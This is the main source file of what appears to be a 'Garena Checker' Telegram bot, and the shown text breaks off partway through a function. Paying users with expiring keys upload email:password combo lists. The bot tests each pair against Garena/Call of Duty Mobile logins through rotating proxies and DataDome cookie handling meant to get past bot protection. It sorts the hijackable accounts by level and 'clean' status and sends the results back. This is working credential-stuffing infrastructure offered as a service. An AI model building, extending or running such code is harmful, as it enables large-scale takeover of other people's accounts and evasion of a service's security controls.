/**
 * index.js — Main entry point: signal handling, polling, watchdog, heartbeat,
 *            bot command routing, callback query handling, checker runner,
 *            KeySystemAPI integration, auto-fetch proxy, persistent storage,
 *            setup wizard, liveness tracking, no-proxy notification,
 *            proxy-paused users auto-resume
 * Ported from Python main.py (the entire bot flow)
 */
const fs        = require('fs');
const path      = require('path');
const axios     = require('axios');

// ── Load config ────────────────────────────────────────────────────────
const config = require('./config');
config.ensureDirs();
const cfg = config.loadConfig();

// ── Handle missing config: setup wizard or wait loop ───────────────────
// If no config.json and no env vars, we need to either:
//   1. Run setup wizard (interactive / TTY mode)
//   2. Wait for env vars (Railway / cloud mode)
// This is handled below in main() after all imports are ready.

// ── Module imports ─────────────────────────────────────────────────────
const { createSession, applyck, getDatadomeCookie, prelogin, login,
        checkCodmAccount, parseAccountDetails, processaccount,
        updateSessionProxy, backoff } = require('./garena');
const { tgApi, tgSend, tgSendButtons, tgAnswerCallback, tgEditMessage,
        tgDeleteMessage, tgDeleteMessagesBulk, tgSendDocument,
        tgGetFileUrl, tgDownloadFile, tgSetCommands, sendResultsZip } = require('./telegram-api');
const { loadKeys, saveKeys, genKey, parseDuration, durLabel,
        createKey, redeemKey, checkAccess,
        KeySystemAPI, getKeySystemAPI, resetKeySystemAPI } = require('./key-system');
const { botState, userData, savedUsers, stopEvents, activeBars,
        genkeyWizard, deleteKeySelection,
        proxyAccumulator, proxyMsgIds,
        loadSavedUsers, saveUsersToDisk, udata,
        getSavedProfile, saveProfile,
        getStopEvent, setStopEvent, isStopRequested, clearStopEvent, getAllStopEvents,
        setActiveBar, getActiveBar, removeActiveBar } = require('./session');
const { isGarenaCredential, parseComboLines, removeDuplicates } = require('./combo-parser');
const { normalizeProxyLine, preprocessProxyText, saveProxiesFromLines,
        uniqueProxyPath, flushProxyAccumulator,
        persistProxies, restoreAllProxies } = require('./proxy-upload');
const { startProxyFetcher } = require('./proxy-fetcher');
const GeoRotator     = require('./geo-rotator');
const CookieManager  = require('./cookie-manager');
const DataDomeManager = require('./datadome-manager');
const LiveStats      = require('./live-stats');
const { startHealthcheckServer, stopHealthcheckServer } = require('./healthcheck');

// ── Global instances ───────────────────────────────────────────────────
const geoRotator     = new GeoRotator();
const cookieManager  = new CookieManager();
const datadomeManager = new DataDomeManager();

// ── Thread / concurrency management ────────────────────────────────────
const MAX_GLOBAL_THREADS   = config.MAX_GLOBAL_THREADS;
const MAX_THREADS_PER_USER = config.MAX_THREADS_PER_USER;
const MAX_CONCURRENT_USERS = config.MAX_CONCURRENT_USERS;
const VIP_THREADS_PER_USER = config.VIP_THREADS_PER_USER;

// Simple async semaphore
class AsyncSemaphore {
  constructor(max) {
    this.max = max;
    this.current = 0;
    this.queue = [];
  }
  async acquire() {
    if (this.current < this.max) {
      this.current++;
      return;
    }
    return new Promise(resolve => this.queue.push(resolve));
  }
  release() {
    this.current--;
    if (this.queue.length > 0) {
      this.current++;
      const next = this.queue.shift();
      next();
    }
  }
  get value() { return this.max - this.current; }
}

const globalSem = new AsyncSemaphore(MAX_GLOBAL_THREADS);
const userSlotSem = new AsyncSemaphore(MAX_CONCURRENT_USERS);

// ── Liveness tracking ──────────────────────────────────────────────────
let _livenessTs = Date.now();
function touchLiveness() {
  _livenessTs = Date.now();
}
function getLivenessAge() {
  return (Date.now() - _livenessTs) / 1000;
}

// ── No-proxy notification ──────────────────────────────────────────────
let _noProxyWarned = false;

function notifyNoProxy(token, chatId = null) {
  // Re-check pool right before sending — avoid race condition
  if (geoRotator.hasProxies()) {
    clearNoProxyWarning();
    return;
  }
  if (_noProxyWarned) return;
  _noProxyWarned = true;

  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  const poolSize = geoRotator.total;
  try {
    tgSend(token, config.getOwnerId(),
      `⚠️ <b>No Proxies Available!</b>\n\n` +
      `⏱ <b>Time:</b> ${now}\n` +
      `📡 <b>Proxy Pool:</b> ${poolSize} proxies\n` +
      `🔧 <b>Action:</b> Upload proxy files to the proxy/ folder\n\n` +
      `<i>Bot is in maintenance mode for non-owner users.</i>`
    );
  } catch { /* ignore */ }
}

function clearNoProxyWarning() {
  _noProxyWarned = false;
}

// ── Proxy-paused users: auto-resume when proxies become available ──────
const _proxyPausedUsers = {}; // chatId -> {combo_path, file_name, lines, user_data}

function registerProxyPaused(chatId, comboPath, fileName, lines, userData) {
  _proxyPausedUsers[String(chatId)] = {
    chat_id: chatId,
    combo_path: comboPath,
    file_name: fileName,
    total_lines: lines.length,
    progress: 0,
    level: userData.level || [1],
    clean_filter: userData.clean_filter || 'both',
    hits_id: userData.hits_id || chatId,
    username: userData.username || '',
    combo_limit: userData.combo_limit || config.COMBO_LINE_LIMIT,
    paused_at: Date.now() / 1000,
  };
  console.log(`[BOT] Registered proxy-paused user: chat_id=${chatId}, file=${fileName}, lines=${lines.length}`);
}

function unregisterProxyPaused(chatId) {
  delete _proxyPausedUsers[String(chatId)];
}

function resumeProxyPausedUsers(token) {
  const paused = { ..._proxyPausedUsers };
  for (const key of Object.keys(_proxyPausedUsers)) {
    delete _proxyPausedUsers[key];
  }

  if (!Object.keys(paused).length) return;

  console.log(`[BOT] ✅ Proxies available! Resuming ${Object.keys(paused).length} paused user(s)...`);

  for (const [key, sess] of Object.entries(paused)) {
    const chatId = sess.chat_id;
    const fileName = sess.file_name || 'unknown.txt';

    tgSend(token, chatId,
      `✅ <b>Proxies are back — Auto-Resuming!</b>\n\n` +
      `📄 <b>File:</b> <code>${fileName}</code>\n` +
      `📊 <b>Remaining:</b> ${sess.total_lines} accounts\n\n` +
      `<i>Please re-upload your combo file to start checking again.</i>`
    );
  }
}

// ── Broadcast accumulator ──────────────────────────────────────────────
const _broadcastAccumulator = {}; // chatId -> [textLine, ...]

// ── Print banner ───────────────────────────────────────────────────────
function printBanner() {
  console.log(`
╔══════════════════════════════════════════════════════════╗
║           🤖 Garena Checker Bot — Node.js               ║
║           CONFIG BY: @Yukiii_ii                         ║
╚══════════════════════════════════════════════════════════╝
  `);
}

// ── Cleanup stale files ────────────────────────────────────────────────
function cleanupStaleFiles() {
  const dataDir = config.DATA_DIR;
  if (!fs.existsSync(dataDir)) return;
  const files = fs.readdirSync(dataDir);
  for (const f of files) {
    if (f.startsWith('combo_') && f.endsWith('.txt')) {
      const fp = path.join(dataDir, f);
      try {
        const stat = fs.statSync(fp);
        if (Date.now() - stat.mtimeMs > 3600000) {
          fs.unlinkSync(fp);
        }
      } catch {}
    }
  }
}

// ── Find nearest account file ──────────────────────────────────────────
function findNearestAccountFile(resultFolder) {
  if (!fs.existsSync(resultFolder)) return null;
  const files = fs.readdirSync(resultFolder);
  for (const name of ['full_details.txt', 'clean.txt', 'notclean.txt']) {
    if (files.includes(name)) return path.join(resultFolder, name);
  }
  return null;
}

// ── Owner check helpers ────────────────────────────────────────────────
function isOwner(fromUser) {
  return config.isOwner(fromUser);
}

function isPrimaryOwner(fromUser) {
  return config.isPrimaryOwner(fromUser);
}

// ── Handle /start ──────────────────────────────────────────────────────
function handleStart(token, chatId, fromUser) {
  const tgId   = fromUser?.id || chatId;
  const uname  = fromUser?.username || '';

  const d = udata(chatId);
  d.hits_id = tgId;
  if (uname) d.username = uname;

  tgSendButtons(token, chatId,
    `👋 <b>Welcome to Garena Checker!</b>\n\n` +
    `🔑 Your ID: <code>${tgId}</code>\n` +
    (uname ? `👤 Username: @${uname}\n` : '') +
    `\n━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `Choose your preferred level:`,
    [
      [
        { text: '💯 Level 100+', callback_data: 'lvl:100' },
        { text: '🇲🇽 Level 200+', callback_data: 'lvl:200' },
      ],
      [
        { text: '🔥 Level 300+', callback_data: 'lvl:300' },
        { text: '💎 Level 400+', callback_data: 'lvl:400' },
      ],
      [
        { text: '🌐 ALL levels', callback_data: 'lvl:all' },
      ],
    ]
  );
}

// ── Ask level (text fallback) ──────────────────────────────────────────
function askLevel(token, chatId) {
  tgSend(token, chatId,
    '🎯 <b>Choose your level filter:</b>\n\n' +
    'Tap a button below or type: <code>100</code>, <code>200</code>, <code>300</code>, <code>400</code>, or <code>all</code>',
    {
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [
            { text: '💯 Level 100+', callback_data: 'lvl:100' },
            { text: '🇲🇽 Level 200+', callback_data: 'lvl:200' },
          ],
          [
            { text: '🔥 Level 300+', callback_data: 'lvl:300' },
            { text: '💎 Level 400+', callback_data: 'lvl:400' },
          ],
          [
            { text: '🌐 ALL levels', callback_data: 'lvl:all' },
          ],
        ]
      })
    }
  );
}

// ── Ask filter ─────────────────────────────────────────────────────────
function askFilter(token, chatId, levelLabel) {
  tgSendButtons(token, chatId,
    `🔍 <b>Level: ${levelLabel}</b>\n\nWhat type of hits do you want?`,
    [
      [
        { text: '✅ CLEAN only', callback_data: 'flt:clean' },
        { text: '❌ NOT CLEAN only', callback_data: 'flt:notclean' },
      ],
      [
        { text: '🔄 BOTH', callback_data: 'flt:both' },
      ],
    ]
  );
}

// ── Handle level input ─────────────────────────────────────────────────
function handleLevel(token, chatId, text) {
  const levelMap = {
    '100': ([100], 'Level 100+'),
    '200': ([200], 'Level 200+'),
    '300': ([300], 'Level 300+'),
    '400': ([400], 'Level 400+'),
    'all': ([1],   'ALL levels'),
  };
  const key = text.trim().toLowerCase();
  if (!levelMap[key]) {
    askLevel(token, chatId);
    return;
  }
  const [thresholds, label] = levelMap[key];
  const d = udata(chatId);
  d.level = thresholds;
  askFilter(token, chatId, label);
}

// ── Handle filter input ────────────────────────────────────────────────
function handleFilter(token, chatId, text) {
  const filterMap = {
    'clean':    ('clean',    '✅ CLEAN only'),
    'notclean': ('notclean', '❌ NOT CLEAN only'),
    'both':     ('both',     '🔄 BOTH'),
  };
  const key = text.trim().toLowerCase();
  if (!filterMap[key]) {
    const d = udata(chatId);
    const lvlLabel = d.level?.[0] === 1 ? 'ALL levels' : `Level ${d.level?.[0]}+`;
    askFilter(token, chatId, lvlLabel);
    return;
  }
  const [cfValue, cfLabel] = filterMap[key];
  const d = udata(chatId);
  d.clean_filter = cfValue;
  botState[chatId] = 'AWAIT_FILE';
  saveProfile(chatId, d);

  const lvlLabel  = d.level?.[0] === 1 ? 'ALL levels' : `Level ${d.level?.[0]}+`;
  const userLimit = d.combo_limit || config.COMBO_LINE_LIMIT;

  tgSend(token, chatId,
    `✅ <b>Config saved!</b>\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `  🔑 Hits ID:  <code>${d.hits_id || chatId}</code>\n` +
    `  🎮 Level:    <code>${lvlLabel}</code>\n` +
    `  🔍 Hit type: <code>${cfLabel}</code>\n` +
    `  📦 Limit:    <code>${userLimit} lines</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `📂 <b>Upload your combo file to start!</b>\n\n` +
    `<i>Use /reset to change settings.</i>\n\n` +
    `<i>Send your file now ⬇️</i>`
  );
}

// ── Check access gate ──────────────────────────────────────────────────
function checkAccessGate(token, chatId, fromUser) {
  const uid = fromUser?.id || chatId;
  if (isOwner(fromUser)) return true;

  const access = checkAccess(uid, savedUsers);
  if (access.allowed) return true;

  if (access.reason === 'expired') {
    tgSend(token, chatId,
      '⏰ <b>Your key has expired!</b>\n\n' +
      'Contact the owner to get a new key.\n' +
      'Use /redeem to enter a new key.');
  } else {
    tgSend(token, chatId,
      '🔐 <b>Access Denied</b>\n\n' +
      'You need a key to use this bot.\n\n' +
      'Use /redeem to enter your key.\n' +
      '<i>Contact the owner to get a key.</i>',
      {
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [{ text: '🔑 Redeem Key', callback_data: 'redeem:prompt' }],
          ]
        })
      }
    );
  }
  return false;
}

// ── Handle file upload & start checker ─────────────────────────────────
async function handleFile(token, chatId, msg, fromUser) {
  const doc = msg.document;
  if (!doc) {
    tgSend(token, chatId, '📂 Please upload a combo file.');
    return;
  }

  const filename = (doc.file_name || '').toLowerCase();
  if (!filename.includes('garena') && !filename.includes('codm')) {
    tgSend(token, chatId,
      '❌ <b>Invalid file name!</b>\n\n' +
      'File name must contain <code>garena</code> or <code>codm</code>\n' +
      '(e.g. <code>garena.txt</code>, <code>codm.txt</code>, <code>Yuki_garena.txt</code>)');
    return;
  }

  // Check if proxies are available before starting
  if (!geoRotator.hasProxies()) {
    notifyNoProxy(token, chatId);
    tgSend(token, chatId,
      '⚠️ <b>No proxies available!</b>\n\n' +
      'The bot cannot check accounts without proxies.\n' +
      'Your check will auto-resume when proxies are available.\n\n' +
      '<i>Contact the owner to upload proxies.</i>'
    );
    // Register for auto-resume
    const d = udata(chatId);
    registerProxyPaused(chatId, '', doc.file_name, [], d);
    return;
  }

  const d = udata(chatId);
  const tgId = d.hits_id || fromUser?.id || chatId;
  const userLimit = d.combo_limit || config.COMBO_LINE_LIMIT;

  // Download file
  const fileId = doc.file_id;
  const comboDir = path.join(config.DATA_DIR, 'combos');
  fs.mkdirSync(comboDir, { recursive: true });
  const comboPath = path.join(comboDir, `combo_${chatId}_${Date.now()}.txt`);

  const statusMsg = await tgSend(token, chatId, '⬇️ <b>Downloading combo file...</b>');

  const downloadResult = await tgDownloadFile(token, fileId, comboPath);
  if (!downloadResult) {
    tgSend(token, chatId, '❌ <b>Failed to download file.</b> Please try again.');
    return;
  }

  // Parse combos
  const content = fs.readFileSync(comboPath, 'utf-8');
  let combos = parseComboLines(content);
  combos = removeDuplicates(combos);

  if (!combos.length) {
    tgSend(token, chatId, '❌ <b>No valid combos found in file.</b>\n\nMake sure format is <code>email:password</code>');
    try { fs.unlinkSync(comboPath); } catch {}
    return;
  }

  if (combos.length > userLimit) {
    combos = combos.slice(0, userLimit);
  }

  const total = combos.length;

  // Create result folder
  const resultFolder = path.join(config.RESULTS_DIR, `result_${chatId}_${Date.now()}`);
  fs.mkdirSync(resultFolder, { recursive: true });

  // Set state to running
  botState[chatId] = 'RUNNING';
  const stopEvt = getStopEvent(chatId);
  stopEvt.clear();

  // Create LiveStats
  const liveStats = new LiveStats(total, d.level || [1], d.clean_filter || 'both');

  // Build telegram config
  const telegramConfig = [
    token,
    tgId,
    d.level || [1],
    '',
    d.clean_filter || 'both',
  ];

  tgSend(token, chatId,
    `🚀 <b>Checker started!</b>\n\n` +
    `📂 File: <code>${doc.file_name}</code>\n` +
    `📊 Total: <code>${total}</code> combos\n` +
    `🎮 Level: <code>${d.level?.[0] === 1 ? 'ALL' : d.level?.[0] + '+'}</code>\n` +
    `🔍 Filter: <code>${d.clean_filter || 'both'}</code>\n\n` +
    `Use /stop to cancel.`
  );

  clearNoProxyWarning();

  // ── Run checker in background ────────────────────────────────────────
  (async () => {
    await userSlotSem.acquire();
    let done = 0;

    // Progress updater
    const progressInterval = setInterval(async () => {
      try {
        setActiveBar(chatId, { done, total, live_stats: liveStats });
      } catch {}
    }, 5000);

    // Progress message updater (Telegram)
    let progressMsgId = null;
    const progressTgInterval = setInterval(async () => {
      try {
        const pct = total > 0 ? (done / total * 100).toFixed(1) : '0.0';
        const fancyProgress = liveStats.getFancyTelegramProgress();
        const text =
          `📊 <b>Progress:</b> <code>${done}/${total}</code> (${pct}%)\n\n${fancyProgress}`;

        if (!progressMsgId) {
          const result = await tgSend(token, chatId, text);
          if (result?.ok && result?.result?.message_id) {
            progressMsgId = result.result.message_id;
          }
        } else {
          await tgEditMessage(token, chatId, progressMsgId, text, []);
        }
      } catch {}
    }, 15000);

    // Process combos with concurrency control via semaphores
    const threadsPerUser = isOwner(fromUser) ? VIP_THREADS_PER_USER : MAX_THREADS_PER_USER;
    const userSem = new AsyncSemaphore(threadsPerUser);

    async function processCombo([account, password]) {
      if (stopEvt.isSet() || config.shutdownEvent.isSet()) return;

      await globalSem.acquire();
      await userSem.acquire();

      let session;
      try {
        const proxyUrl = geoRotator.getCurrentProxy();

        // If no proxy available mid-check, notify and pause
        if (!proxyUrl && !geoRotator.hasProxies()) {
          notifyNoProxy(token);
        }

        session = createSession(proxyUrl);

        await processaccount(
          session, account, password,
          cookieManager, datadomeManager,
          liveStats, geoRotator,
          resultFolder, telegramConfig,
          tgSend
        );

        touchLiveness();
      } catch (e) {
        console.error(`[CHECKER] Error processing ${account}:`, e.message);
        liveStats.recordError();
      } finally {
        done++;
        if (session) {
          session.defaults._cookies = {};
          session.interceptors.request.handlers = [];
          session.interceptors.response.handlers = [];
        }
        session = null;
        globalSem.release();
        userSem.release();
      }
    }

    // Process in small chunks to avoid memory spike
    const CHUNK_SIZE = threadsPerUser * 2;
    for (let i = 0; i < combos.length; i += CHUNK_SIZE) {
      if (stopEvt.isSet() || config.shutdownEvent.isSet()) break;
      const chunk = combos.slice(i, i + CHUNK_SIZE);
      await Promise.all(chunk.map(c => processCombo(c)));
      if (global.gc) global.gc();
    }

    clearInterval(progressInterval);
    clearInterval(progressTgInterval);

    const finalStats = liveStats.getFancyTelegramProgress();
    await tgSend(token, chatId, `✅ <b>Checker Complete!</b>\n\n${finalStats}`);

    // Send results
    if (fs.existsSync(resultFolder)) {
      const hasFiles = fs.readdirSync(resultFolder).some(f =>
        f.endsWith('.txt') || f.endsWith('.zip')
      );
      if (hasFiles) {
        const allItems = fs.readdirSync(resultFolder, { recursive: true });
        const txtFiles = allItems.filter(f => String(f).endsWith('.txt'));
        if (txtFiles.length > 0) {
          await sendResultsZip(token, chatId, resultFolder);
        }
      }
    }

    botState[chatId] = 'AWAIT_FILE';
    try { fs.unlinkSync(comboPath); } catch {}
    userSlotSem.release();

  })().catch(e => {
    console.error('[CHECKER] Fatal error:', e);
    botState[chatId] = 'AWAIT_FILE';
    userSlotSem.release();
  });
}

// ── Handle help (owner menu with inline buttons) ───────────────────────
function handleHelp(token, chatId, fromUser) {
  if (!isOwner(fromUser)) {
    tgSend(token, chatId,
      '📋 <b>User Commands:</b>\n\n' +
      '/start — Start / configure\n' +
      '/help — Show this help\n' +
      '/stop — Stop your checker\n' +
      '/reset — Reset settings\n' +
      '/redeem — Redeem a key'
    );
    return;
  }

  tgSendButtons(token, chatId,
    '👑 <b>Owner Panel</b>\n\nSelect an action:',
    [
      [
        { text: '🔑 Generate Key', callback_data: 'admin:genkey' },
        { text: '📊 Key Status', callback_data: 'admin:statuskey' },
      ],
      [
        { text: '🗑 Delete Keys', callback_data: 'admin:deletekey_menu' },
        { text: '🖥 Server Status', callback_data: 'admin:serverstatus' },
      ],
      [
        { text: '📡 Proxy Status', callback_data: 'admin:proxystatus' },
        { text: '📤 Upload Proxy', callback_data: 'admin:upload_proxy' },
      ],
      [
        { text: '🔗 KeyVault Config', callback_data: 'admin:keysystem' },
        { text: '🔄 Refresh', callback_data: 'admin:refresh' },
      ],
    ]
  );
}

// ── Handle server status ───────────────────────────────────────────────
function handleServerStatus(token, chatId) {
  const mem = process.memoryUsage();
  const rss = Math.round(mem.rss / 1024 / 1024);
  const heapUsed = Math.round(mem.heapUsed / 1024 / 1024);
  const heapTotal = Math.round(mem.heapTotal / 1024 / 1024);
  const livenessAge = Math.round(getLivenessAge());

  const activeCheckers = Object.values(botState).filter(s => s === 'RUNNING').length;
  const totalProxies = geoRotator.total;
  const currentProxy = geoRotator.currentProxy || 'None';
  const pausedUsers = Object.keys(_proxyPausedUsers).length;

  // KeyVault status
  const api = getKeySystemAPI();
  const keysystemStatus = api.enabled ? '✅ Connected' : '❌ Not configured';

  tgSend(token, chatId,
    `🖥 <b>Server Status</b>\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `💾 Memory: <b>${rss}MB</b> RSS / <b>${heapUsed}MB</b> / <b>${heapTotal}MB</b>\n` +
    `🔄 Active Checkers: <b>${activeCheckers}</b>\n` +
    `🌐 Proxy: <code>${currentProxy}</code>\n` +
    `📡 Total Proxies: <b>${totalProxies}</b>\n` +
    `⏸ Paused Users: <b>${pausedUsers}</b>\n` +
    `🧵 Max Threads: <b>${MAX_GLOBAL_THREADS}</b>\n` +
    `⏱ Uptime: <b>${Math.floor(process.uptime())}s</b>\n` +
    `💓 Liveness: <b>${livenessAge}s ago</b>\n` +
    `🔗 KeyVault: <b>${keysystemStatus}</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━`
  );
}

// ── Handle proxy status ────────────────────────────────────────────────
function handleProxyStatus(token, chatId) {
  const proxyFiles = config.getProxyFiles();
  const total = geoRotator.total;
  const current = geoRotator.currentProxy || 'None';
  const blocked = geoRotator.blockedSet.size;
  const available = geoRotator.getProxies().length;

  let filesInfo = 'None';
  if (proxyFiles.length) {
    filesInfo = proxyFiles.map(fp => {
      const name = path.basename(fp);
      try {
        const count = fs.readFileSync(fp, 'utf-8').split('\n').filter(l => l.trim()).length;
        return `${name} (${count})`;
      } catch { return name; }
    }).join('\n');
  }

  tgSend(token, chatId,
    `📡 <b>Proxy Status</b>\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🌐 Current: <code>${current}</code>\n` +
    `📊 Total: <b>${total}</b>\n` +
    `✅ Available: <b>${available}</b>\n` +
    `🚫 Blocked: <b>${blocked}</b>\n` +
    `📂 Files:\n<code>${filesInfo}</code>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━`
  );
}

// ── Key status handler ─────────────────────────────────────────────────
function handleStatusKey(token, chatId, keyArg) {
  const keys = loadKeys();
  const keyList = Object.entries(keys);

  if (!keyList.length) {
    tgSend(token, chatId, '📊 <b>No keys found.</b>');
    return;
  }

  const now = Date.now() / 1000;
  let text = `📊 <b>Key Status</b> (${keyList.length} keys)\n━━━━━━━━━━━━━━━━━━━━━━━━\n`;

  for (const [key, data] of keyList) {
    const expired = now >= (data.expires || 0);
    const status  = expired ? '❌ Expired' : '✅ Active';
    const usedBy  = data.used_by?.length || 0;
    const maxUsers = data.max_users || 0;
    const expiresIn = expired ? 'Expired' : durLabel(data.expires - now);

    text += `\n🔑 <code>${key.slice(0, 8)}...</code>\n`;
    text += `   ${status} | ⏳ ${expiresIn} | 👥 ${usedBy}/${maxUsers || '∞'} | 📦 ${data.combo_limit || '∞'}\n`;
  }

  if (text.length > 4000) {
    const chunks = [];
    let current = `📊 <b>Key Status</b> (${keyList.length} keys)\n━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    for (const [key, data] of keyList) {
      const expired = now >= (data.expires || 0);
      const status  = expired ? '❌ Expired' : '✅ Active';
      const line = `🔑 <code>${key.slice(0, 8)}...</code> ${status} ⏳${expired ? 'Expired' : durLabel(data.expires - now)} 👥${data.used_by?.length || 0}/${data.max_users || '∞'} 📦${data.combo_limit || '∞'}\n`;
      if (current.length + line.length > 3800) {
        chunks.push(current);
        current = '';
      }
      current += line;
    }
    if (current) chunks.push(current);
    for (const chunk of chunks) tgSend(token, chatId, chunk);
  } else {
    tgSend(token, chatId, text);
  }
}

// ── Delete key helpers ─────────────────────────────────────────────────
function buildDeleteKeyKeyboard(keys, selected, now) {
  const keyboard = [];
  for (const [key, data] of Object.entries(keys)) {
    const expired = now >= (data.expires || 0);
    const icon = selected.has(key) ? '☑️' : (expired ? '❌' : '✅');
    keyboard.push([{
      text: `${icon} ${key.slice(0, 12)}... (${durLabel(data.duration)})`,
      callback_data: `dk_toggle:${key}`
    }]);
  }
  keyboard.push([
    { text: '🗑 Expired', callback_data: 'dk_sel:expired' },
    { text: '� Unused', callback_data: 'dk_sel:unused' },
  ]);
  keyboard.push([
    { text: '✅ All', callback_data: 'dk_sel:all' },
    { text: '❌ None', callback_data: 'dk_sel:none' },
  ]);
  keyboard.push([
    { text: '💥 Delete Selected', callback_data: 'dk_confirm' },
    { text: '↩️ Cancel', callback_data: 'dk_cancel' },
  ]);
  return keyboard;
}

function deleteKeyHeader(keys, selected, now) {
  const total = Object.keys(keys).length;
  const selCount = selected.size;
  return `🗑 <b>Delete Keys</b> (${selCount}/${total} selected)\n\nTap keys to select/deselect:`;
}

function handleDeleteKey(token, chatId, fromUser, keyArg) {
  if (keyArg) {
    const keys = loadKeys();
    if (keys[keyArg]) {
      delete keys[keyArg];
      saveKeys(keys);
      tgSend(token, chatId, `✅ Key <code>${keyArg}</code> deleted.`);
    } else {
      tgSend(token, chatId, `❌ Key <code>${keyArg}</code> not found.`);
    }
    return;
  }
  const keys = loadKeys();
  if (!Object.keys(keys).length) {
    tgSend(token, chatId, '📊 <b>No keys found.</b>');
    return;
  }
  deleteKeySelection[chatId] = new Set();
  const now = Date.now() / 1000;
  tgSendButtons(token, chatId,
    deleteKeyHeader(keys, deleteKeySelection[chatId], now),
    buildDeleteKeyKeyboard(keys, deleteKeySelection[chatId], now)
  );
}

// ── Handle redeem ──────────────────────────────────────────────────────
function handleRedeem(token, chatId, fromUser, keyArg) {
  if (!keyArg) {
    tgSend(token, chatId,
      '🔑 <b>Redeem Key</b>\n\nType your key:\n<code>/redeem YOUR_KEY</code>');
    return;
  }

  const uid = String(fromUser?.id || chatId);
  const result = redeemKey(keyArg, uid);

  if (result.success) {
    const d = udata(chatId);
    d.key = keyArg;
    d.key_expires = result.key_expires;
    d.combo_limit = result.combo_limit || config.COMBO_LINE_LIMIT;
    botState[chatId] = 'AWAIT_LEVEL';
    saveProfile(chatId, d);
  }

  tgSend(token, chatId, result.message);
}

// ── Genkey wizard helpers ──────────────────────────────────────────────
function askGenkeyUsers(token, chatId, duration) {
  tgSendButtons(token, chatId,
    `🔑 <b>Generate Key — Step 2 of 4</b>\n\n` +
    `⏳ Duration: <b>${durLabel(duration)}</b>\n\n` +
    `👥 How many users can use this key?\n\n` +
    `<i>Tap a button or type a number</i>`,
    [
      [
        { text: '1 User',  callback_data: 'gk_usr:1' },
        { text: '3 Users', callback_data: 'gk_usr:3' },
        { text: '5 Users', callback_data: 'gk_usr:5' },
      ],
      [
        { text: '10 Users',  callback_data: 'gk_usr:10' },
        { text: '∞ Unlimited', callback_data: 'gk_usr:0' },
        { text: '❌ Cancel',   callback_data: 'gk_cancel' },
      ],
    ]
  );
}

function askGenkeyLimit(token, chatId, duration, maxUsers) {
  tgSendButtons(token, chatId,
    `🔑 <b>Generate Key — Step 3 of 4</b>\n\n` +
    `⏳ Duration: <b>${durLabel(duration)}</b>\n` +
    `👥 Max users: <b>${maxUsers || 'Unlimited'}</b>\n\n` +
    `📦 Combo limit per key?\n\n` +
    `<i>Tap a button or type a number</i>`,
    [
      [
        { text: '1,000',  callback_data: 'gk_lim:1000' },
        { text: '5,000',  callback_data: 'gk_lim:5000' },
        { text: '10,000', callback_data: 'gk_lim:10000' },
      ],
      [
        { text: '50,000', callback_data: 'gk_lim:50000' },
        { text: '∞ Unlimited', callback_data: 'gk_lim:0' },
        { text: '❌ Cancel',   callback_data: 'gk_cancel' },
      ],
    ]
  );
}

function askGenkeyCount(token, chatId, duration, maxUsers, limit) {
  tgSendButtons(token, chatId,
    `🔑 <b>Generate Key — Step 4 of 4</b>\n\n` +
    `⏳ Duration: <b>${durLabel(duration)}</b>\n` +
    `👥 Max users: <b>${maxUsers || 'Unlimited'}</b>\n` +
    `📦 Limit: <b>${limit || 'Unlimited'}</b>\n\n` +
    `🔢 How many keys to generate? (1-500)`,
    [
      [
        { text: '1',  callback_data: 'gk_cnt:1' },
        { text: '5',  callback_data: 'gk_cnt:5' },
        { text: '10', callback_data: 'gk_cnt:10' },
      ],
      [
        { text: '25', callback_data: 'gk_cnt:25' },
        { text: '50', callback_data: 'gk_cnt:50' },
        { text: '❌ Cancel', callback_data: 'gk_cancel' },
      ],
    ]
  );
}

function finalizeGenKey(token, chatId, duration, comboLimit, count, maxUsers) {
  const keys = [];
  for (let i = 0; i < count; i++) {
    const key = createKey(duration, comboLimit, maxUsers);
    keys.push(key);
  }

  let text = `✅ <b>${keys.length} key(s) generated!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  text += `⏳ Duration: <b>${durLabel(duration)}</b>\n`;
  text += `👥 Max users: <b>${maxUsers || 'Unlimited'}</b>\n`;
  text += `📦 Combo limit: <b>${comboLimit || 'Unlimited'}</b>\n\n`;

  for (const key of keys) {
    text += `🔑 <code>${key}</code>\n`;
  }

  tgSend(token, chatId, text);
  delete genkeyWizard[chatId];
}

// ── Handle /keysystem command ──────────────────────────────────────────
function handleKeySystemConfig(token, chatId, fromUser, args) {
  if (!isOwner(fromUser)) {
    tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
    return;
  }

  const api = getKeySystemAPI();
  const parts = args.trim().split(/\s+/);
  const subcmd = (parts[0] || '').toLowerCase();
  const value = parts.slice(1).join(' ').trim();

  if (!subcmd) {
    // Show current config
    const status = api.enabled ? '✅ Connected' : '❌ Not configured';
    const urlDisplay = api.base_url || '<i>not set</i>';
    const secretDisplay = api.admin_secret ? '***' : '<i>not set</i>';
    tgSend(token, chatId,
      `🔗 <b>KeyVault API Config</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `📡 <b>Status:</b> ${status}\n` +
      `🌐 <b>URL:</b> ${urlDisplay}\n` +
      `🔐 <b>Secret:</b> ${secretDisplay}\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `<b>Usage:</b>\n` +
      `  <code>/keysystem url https://your-app.vercel.app</code>\n` +
      `  <code>/keysystem secret YOUR_ADMIN_SECRET</code>\n` +
      `  <code>/keysystem status</code> — test connection`
    );
    return;
  }

  if (subcmd === 'url') {
    if (!value) {
      tgSend(token, chatId, '❌ Provide a URL: <code>/keysystem url https://...</code>');
      return;
    }
    const cfg = config.loadConfig() || {};
    cfg.keysystem_url = value.replace(/\/+$/, '');
    config.saveConfig(cfg);
    api.reloadConfig();
    resetKeySystemAPI(); // recreate singleton with new config
    tgSend(token, chatId,
      `✅ <b>KeyVault URL set!</b>\n\n` +
      `🌐 <code>${value}</code>\n\n` +
